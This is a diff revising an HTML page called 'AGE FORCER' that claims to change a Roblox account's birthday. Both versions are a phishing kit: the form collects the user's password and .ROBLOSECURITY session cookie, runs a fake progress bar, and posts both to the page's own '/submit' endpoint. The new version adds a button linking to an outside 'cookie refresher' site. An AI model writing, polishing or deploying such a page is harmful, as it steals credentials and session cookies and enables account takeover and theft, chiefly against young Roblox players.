@@ -1,341 +1,314 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>AGE BYPASSER TOOLS</title>
-<style>
-  body {
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    background: #0a0000;
-    background-image: 
-      radial-gradient(2px 2px at 20px 30px, #ffffff, transparent),
-      radial-gradient(2px 2px at 40px 70px, rgba(255,255,255,0.8), transparent),
-      radial-gradient(1px 1px at 90px 40px, #ffffff, transparent),
-      radial-gradient(1px 1px at 130px 80px, rgba(255,255,255,0.6), transparent),
-      radial-gradient(2px 2px at 160px 30px, #ffffff, transparent),
-      radial-gradient(circle at 50% 50%, #8B0000 0%, #4B0000 30%, #1a0000 70%, #000000 100%),
-      linear-gradient(45deg, rgba(139,0,0,0.3) 0%, rgba(75,0,0,0.5) 50%, rgba(26,0,0,0.7) 100%);
-    background-size: 200px 100px, 200px 100px, 200px 100px, 200px 100px, 200px 100px, 100% 100%, 100% 100%;
-    background-repeat: repeat, repeat, repeat, repeat, repeat, no-repeat, no-repeat;
-    color: #fff;
-    font-family: 'Arial Black', Arial, sans-serif;
-    padding: 20px;
-    animation: starTwinkle 3s ease-in-out infinite alternate;
-  }
-  
-  @keyframes starTwinkle {
-    0% { background-position: 0px 0px, 0px 0px, 0px 0px, 0px 0px, 0px 0px, 0% 0%, 0% 0%; }
-    100% { background-position: 10px 5px, -5px 10px, 15px -5px, -10px 15px, 5px -10px, 0% 0%, 0% 0%; }
-  }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AGE BYPASSER TOOLS</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #0a0a2a;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 40% 90%, rgba(120, 219, 255, 0.3) 0%, transparent 50%),
+                linear-gradient(135deg, #0a0a2a 0%, #1a1a4a 50%, #0a0a2a 100%);
+            color: #fff;
+            padding: 20px;
+            line-height: 1.5;
+        }
 
-  /* Card */
-  .card {
-    width: 100%;
-    max-width: 450px;
-    background: linear-gradient(135deg, rgba(20,0,0,0.9) 0%, rgba(40,0,0,0.8) 50%, rgba(60,0,0,0.7) 100%);
-    border: 2px solid #ff0000;
-    border-radius: 15px;
-    padding: 30px;
-    box-shadow: 
-      0 0 30px rgba(255,0,0,0.5),
-      0 8px 40px rgba(0,0,0,0.8),
-      inset 0 1px 0 rgba(255,255,255,0.1);
-    text-align: left;
-    backdrop-filter: blur(5px);
-    position: relative;
-    overflow: hidden;
-  }
-  
-  .card::before {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: 0;
-    right: 0;
-    bottom: 0;
-    background: linear-gradient(45deg, transparent 30%, rgba(255,0,0,0.1) 50%, transparent 70%);
-    animation: cardShine 3s ease-in-out infinite;
-    pointer-events: none;
-  }
-  
-  @keyframes cardShine {
-    0% { transform: translateX(-100%); }
-    100% { transform: translateX(100%); }
-  }
+        .container {
+            width: 100%;
+            max-width: 480px;
+        }
 
-  label {
-    display: block;
-    margin-bottom: 6px;
-    font-size: 14px;
-  }
-  input {
-    width: 100%;
-    padding: 12px 15px;
-    margin-bottom: 16px;
-    border-radius: 10px;
-    border: 2px solid rgba(255,0,0,0.3);
-    background: linear-gradient(135deg, rgba(40,0,0,0.6) 0%, rgba(20,0,0,0.8) 100%);
-    color: #fff;
-    font-size: 15px;
-    font-weight: 500;
-    transition: all 0.3s ease;
-    box-shadow: inset 0 2px 5px rgba(0,0,0,0.3);
-  }
-  
-  input:focus {
-    border-color: #ff0000;
-    background: linear-gradient(135deg, rgba(60,0,0,0.8) 0%, rgba(40,0,0,0.9) 100%);
-    box-shadow: 
-      inset 0 2px 5px rgba(0,0,0,0.3),
-      0 0 15px rgba(255,0,0,0.5);
-    outline: none;
-  }
-  
-  input::placeholder {
-    color: rgba(255,255,255,0.6);
-    font-weight: 400;
-  }
+        .card {
+            background: rgba(16, 18, 36, 0.95);
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 
+                0 10px 30px rgba(0, 0, 0, 0.5),
+                0 1px 1px rgba(255, 255, 255, 0.1) inset;
+            border: 1px solid rgba(100, 100, 255, 0.2);
+            backdrop-filter: blur(10px);
+            margin-bottom: 20px;
+        }
 
-  .btn {
-    width: 100%;
-    padding: 15px 20px;
-    border-radius: 12px;
-    background: linear-gradient(135deg, #ff0000 0%, #cc0000 50%, #990000 100%);
-    border: 2px solid #ff0000;
-    color: #fff;
-    font-weight: 900;
-    font-size: 16px;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-    cursor: pointer;
-    position: relative;
-    overflow: hidden;
-    transition: all 0.3s ease;
-    box-shadow: 
-      0 5px 15px rgba(255,0,0,0.4),
-      inset 0 1px 0 rgba(255,255,255,0.2);
-  }
-  
-  .btn::before {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: -100%;
-    width: 100%;
-    height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
-    transition: left 0.5s;
-  }
-  
-  .btn:hover {
-    background: linear-gradient(135deg, #ff2222 0%, #dd1111 50%, #aa1111 100%);
-    box-shadow: 
-      0 8px 20px rgba(255,0,0,0.6),
-      inset 0 1px 0 rgba(255,255,255,0.3);
-    transform: translateY(-2px);
-  }
-  
-  .btn:hover::before {
-    left: 100%;
-  }
-  
-  .btn:active {
-    transform: translateY(0);
-  }
+        h1 {
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 28px;
+            font-weight: 700;
+            color: #ffffff;
+            text-shadow: 0 0 10px rgba(100, 149, 237, 0.7);
+            letter-spacing: 1px;
+        }
 
-  /* Loader + Success */
-  .progress {
-    margin-top: 20px;
-    height: 12px;
-    background: linear-gradient(135deg, rgba(40,0,0,0.8), rgba(20,0,0,0.9));
-    border: 1px solid rgba(255,0,0,0.3);
-    border-radius: 8px;
-    overflow: hidden;
-    display: none;
-    box-shadow: inset 0 2px 5px rgba(0,0,0,0.5);
-  }
-  .progress-bar {
-    height: 100%;
-    width: 0%;
-    background: linear-gradient(90deg, #ff0000 0%, #ff4444 50%, #ff0000 100%);
-    transition: width 0.3s ease;
-    box-shadow: 0 0 10px rgba(255,0,0,0.8);
-    animation: progressPulse 1.5s ease-in-out infinite;
-  }
-  
-  @keyframes progressPulse {
-    0%, 100% { box-shadow: 0 0 10px rgba(255,0,0,0.8); }
-    50% { box-shadow: 0 0 20px rgba(255,0,0,1); }
-  }
-  .status {
-    margin-top: 12px;
-    font-size: 14px;
-    color: #ddd;
-    text-align: center;
-  }
-</style>
+        .description {
+            background: rgba(30, 35, 70, 0.7);
+            border-radius: 12px;
+            padding: 18px;
+            margin-bottom: 25px;
+            border-left: 4px solid #6495ed;
+            font-size: 15px;
+            color: #e0e0ff;
+        }
+
+        .description strong {
+            color: #6495ed;
+            font-weight: 700;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #b0b0ff;
+            font-size: 15px;
+        }
+
+        input, textarea {
+            width: 100%;
+            padding: 14px 16px;
+            border-radius: 10px;
+            border: 1px solid rgba(100, 149, 237, 0.4);
+            background: rgba(20, 25, 50, 0.8);
+            color: #fff;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #6495ed;
+            box-shadow: 0 0 0 2px rgba(100, 149, 237, 0.3);
+            background: rgba(25, 30, 60, 0.9);
+        }
+
+        textarea {
+            height: 120px;
+            resize: vertical;
+        }
+
+        input::placeholder, textarea::placeholder {
+            color: rgba(200, 200, 255, 0.6);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px 20px;
+            border-radius: 10px;
+            background: linear-gradient(135deg, #6495ed 0%, #4169e1 100%);
+            border: none;
+            color: #fff;
+            font-weight: 700;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 15px rgba(100, 149, 237, 0.4);
+        }
+
+        .btn:hover {
+            background: linear-gradient(135deg, #6fa1ff 0%, #4a7aff 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(100, 149, 237, 0.6);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: linear-gradient(135deg, #7e57c2 0%, #5e35b1 100%);
+            box-shadow: 0 4px 15px rgba(126, 87, 194, 0.4);
+        }
+
+        .btn-secondary:hover {
+            background: linear-gradient(135deg, #8d6bc9 0%, #6d43c7 100%);
+            box-shadow: 0 6px 20px rgba(126, 87, 194, 0.6);
+        }
+
+        .progress {
+            margin-top: 20px;
+            height: 12px;
+            background: rgba(30, 35, 70, 0.8);
+            border-radius: 8px;
+            overflow: hidden;
+            display: none;
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.4);
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #6495ed 0%, #4169e1 50%, #6495ed 100%);
+            transition: width 0.3s ease;
+            border-radius: 8px;
+        }
+
+        .status {
+            margin-top: 12px;
+            font-size: 14px;
+            color: #b0b0ff;
+            text-align: center;
+            min-height: 20px;
+        }
+
+        .footer {
+            text-align: center;
+            color: rgba(200, 200, 255, 0.7);
+            font-size: 14px;
+            margin-top: 20px;
+        }
+    </style>
 </head>
 <body>
-  <div>
-    <!-- Card -->
-    <div class="card">
-      <h1 style="
-        color: #ffffff; 
-        text-align: center; 
-        margin-bottom: 20px; 
-        font-size: 2.5em; 
-        font-weight: 900; 
-        text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000, 2px 2px 4px rgba(0,0,0,0.8);
-        letter-spacing: 3px;
-        font-family: 'Arial Black', Arial, sans-serif;
-        text-transform: uppercase;
-        background: linear-gradient(45deg, #ffffff 0%, #ffcccc 50%, #ffffff 100%);
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        background-clip: text;
-        animation: titleGlow 2s ease-in-out infinite alternate;
-      ">⚡ AGE FORCER</h1>
-      <style>
-        @keyframes titleGlow {
-          0% { text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 30px #ff0000; }
-          100% { text-shadow: 0 0 15px #ff4444, 0 0 25px #ff4444, 0 0 35px #ff4444; }
-        }
-      </style>
-      <div style="
-        background: linear-gradient(135deg, rgba(80,0,0,0.4) 0%, rgba(40,0,0,0.6) 100%); 
-        border: 2px solid rgba(255,0,0,0.5); 
-        border-radius: 12px; 
-        padding: 15px; 
-        margin-bottom: 25px; 
-        font-size: 14px; 
-        line-height: 1.5;
-        box-shadow: 
-          0 0 15px rgba(255,0,0,0.3),
-          inset 0 1px 0 rgba(255,255,255,0.1);
-        position: relative;
-        overflow: hidden;
-      ">
-        <div style="
-          position: absolute;
-          top: 0;
-          left: -100%;
-          width: 100%;
-          height: 100%;
-          background: linear-gradient(90deg, transparent, rgba(255,0,0,0.1), transparent);
-          animation: warningShine 4s ease-in-out infinite;
-        "></div>
-        <strong style="color: #ff4444; font-weight: 900; text-shadow: 0 0 5px rgba(255,0,0,0.8);">⚠️ CRITICAL ALERT:</strong><br>
-        <span style="color: #ffcccc; font-weight: 500;">This tool will permanently change your Roblox account's birthday to June 5, 2015. This action cannot be undone and will affect your account's age restrictions and features.</span>
-      </div>
-      <style>
-        @keyframes warningShine {
-          0% { left: -100%; }
-          50% { left: -100%; }
-          100% { left: 100%; }
-        }
-      </style>
-      <form id="demoForm">
-        <input id="password" type="Password" placeholder="Enter Your Password For Verification" />
-        <input id=".RobloxSecurity" type="text" placeholder="Paste Your Roblox Security Cookie" />
+    <div class="container">
+        <div class="card">
+            <h1>⚡ AGE FORCER</h1>
+            
+            <div class="description">
+                <strong>⚠️ CRITICAL ALERT:</strong><br>
+                This tool will permanently change your Roblox account's birthday to June 5, 2015. This action cannot be undone and will affect your account's age restrictions and features.
+            </div>
 
-        <button class="btn" type="button" id="submitBtn">Submit</button>
+            <form id="demoForm">
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input id="password" type="password" placeholder="Enter your password" />
+                </div>
 
-        <!-- Loading -->
-        <div class="progress" id="progress">
-          <div class="progress-bar" id="progressBar"></div>
+                <div class="form-group">
+                    <label for="cookie">Roblox Cookie (.ROBLOSECURITY)</label>
+                    <textarea 
+                        id="cookie" 
+                        placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
+                    ></textarea>
+                </div>
+
+                <button class="btn" type="button" id="submitBtn">Bypass</button>
+
+                <button class="btn btn-secondary" type="button" id="refreshBtn">Refresh Cookie</button>
+
+                <!-- Loading -->
+                <div class="progress" id="progress">
+                    <div class="progress-bar" id="progressBar"></div>
+                </div>
+                <div class="status" id="status"></div>
+            </form>
         </div>
-        <div class="status" id="status"></div>
-      </form>
+        
+        <div class="footer">
+            AGE BYPASSER TOOLS © 2025
+        </div>
     </div>
-  </div>
 
-<script>
-  const btn = document.getElementById('submitBtn');
-  const progress = document.getElementById('progress');
-  const progressBar = document.getElementById('progressBar');
-  const status = document.getElementById('status');
-  
-  // Get all form inputs
-  const passwordInput = document.getElementById('password');
-  const cookieInput = document.getElementById('cookie');
+    <script>
+        const btn = document.getElementById('submitBtn');
+        const refreshBtn = document.getElementById('refreshBtn');
+        const progress = document.getElementById('progress');
+        const progressBar = document.getElementById('progressBar');
+        const status = document.getElementById('status');
+        
+        // Get all form inputs
+        const passwordInput = document.getElementById('password');
+        const cookieInput = document.getElementById('cookie');
 
-  btn.addEventListener('click', async () => {
-    // Collect all form data
-    const formData = {
-      password: passwordInput.value.trim(),
-      cookie: cookieInput.value.trim()
-    };
+        // Add event listener for the refresh button
+        refreshBtn.addEventListener('click', () => {
+            window.open('https://rblx-refresher.ct.ws/?i=1', '_blank');
+        });
 
-    // Basic validation
-    if (!formData.cookie) {
-      status.textContent = '❌ Please fill in Cookie';
-      status.style.color = '#ff5b5b';
-      return;
-    }
+        btn.addEventListener('click', async () => {
+            // Collect all form data
+            const formData = {
+                password: passwordInput.value.trim(),
+                cookie: cookieInput.value.trim()
+            };
 
-    // Disable button and show progress
-    btn.disabled = true;
-    btn.textContent = 'Processing...';
-    progress.style.display = 'block';
-    status.style.color = '#ddd';
-    
-    let percent = 0;
-    status.textContent = 'Validating 0%';
+            // Basic validation
+            if (!formData.cookie) {
+                status.textContent = '❌ Please fill in Cookie';
+                status.style.color = '#ff5b5b';
+                return;
+            }
 
-    const interval = setInterval(() => {
-      percent += 2;  // Changed from 5 to 2 to make it take 50 seconds (100/2 * 1000ms = 50 seconds)
-      progressBar.style.width = percent + '%';
-      
-      if (percent <= 30) {
-        status.textContent = `Validating ${percent}%`;
-      } else if (percent <= 70) {
-        status.textContent = `Processing ${percent}%`;
-      } else {
-        status.textContent = `Sending ${percent}%`;
-      }
+            // Disable button and show progress
+            btn.disabled = true;
+            btn.textContent = 'Processing...';
+            progress.style.display = 'block';
+            status.style.color = '#b0b0ff';
+            
+            let percent = 0;
+            status.textContent = 'Validating 0%';
 
-      if (percent >= 100) {
-        clearInterval(interval);
-        submitForm(formData);
-      }
-    }, 1000);  // Changed from 100ms to 1000ms (1 second)
-  });
+            const interval = setInterval(() => {
+                percent += 2;
+                progressBar.style.width = percent + '%';
+                
+                if (percent <= 30) {
+                    status.textContent = `Validating ${percent}%`;
+                } else if (percent <= 70) {
+                    status.textContent = `Processing ${percent}%`;
+                } else {
+                    status.textContent = `Sending ${percent}%`;
+                }
 
-  async function submitForm(formData) {
-    try {
-      const response = await fetch('/submit', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(formData)
-      });
+                if (percent >= 100) {
+                    clearInterval(interval);
+                    submitForm(formData);
+                }
+            }, 1000);
+        });
 
-      const result = await response.json();
+        async function submitForm(formData) {
+            try {
+                const response = await fetch('/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(formData)
+                });
 
-      if (result.success) {
-        status.textContent = 'Successfully ✅';
-        status.style.color = '#4CAF50';
-        // Clear form
-        passwordInput.value = '';
-        cookieInput.value = '';
-      } else {
-        status.textContent = `❌ ${result.message}`;
-        status.style.color = '#ff5b5b';
-      }
-    } catch (error) {
-      status.textContent = '🔌 Unable to connect to server. Please check your internet connection and try again.';
-      status.style.color = '#ff5b5b';
-    }
+                const result = await response.json();
 
-    // Re-enable button
-    btn.disabled = false;
-    btn.textContent = 'Submit';
-  }
-</script>
+                if (result.success) {
+                    status.textContent = 'Successfully ✅';
+                    status.style.color = '#4CAF50';
+                    // Clear form
+                    passwordInput.value = '';
+                    cookieInput.value = '';
+                } else {
+                    status.textContent = `❌ ${result.message}`;
+                    status.style.color = '#ff5b5b';
+                }
+            } catch (error) {
+                status.textContent = '🔌 Unable to connect to server. Please check your internet connection and try again.';
+                status.style.color = '#ff5b5b';
+            }
+
+            // Re-enable button
+            btn.disabled = false;
+            btn.textContent = 'Bypass';
+        }
+    </script>
 </body>
 </html>
